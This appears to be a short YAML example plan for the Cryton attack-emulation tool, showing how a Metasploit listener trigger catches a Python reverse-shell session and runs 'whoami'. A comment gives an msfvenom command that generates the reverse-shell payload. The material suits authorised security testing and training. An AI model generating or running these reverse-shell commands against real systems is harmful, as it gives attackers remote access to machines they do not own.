---
# This example shows the usage of the MSFListener trigger type.
# Required modules: command.
# To trigger the MSFListener, generate the script using `msfvenom` tool
# (msfvenom -p python/shell_reverse_tcp lhost=<Metasploit host's IP address> lport=4444 > r_shell.py) and execute the script.

plan:
  name: MSFListener trigger example
  owner: Cryton
  stages:
    - name: stage-msf # creates `stage-msf_session`
      trigger_type: MSFListener
      trigger_args:
        module_name: multi/handler
        datastore:
          PAYLOAD: python/shell_reverse_tcp
          LHOST: {{ metasploit_host_address }}
          LPORT: 4444
      steps:
        - name: execute-in-session
          is_init: true
          step_type: worker/execute
          arguments:
            use_named_session: stage-msf_session
            module: command
            module_arguments:
              command: whoami
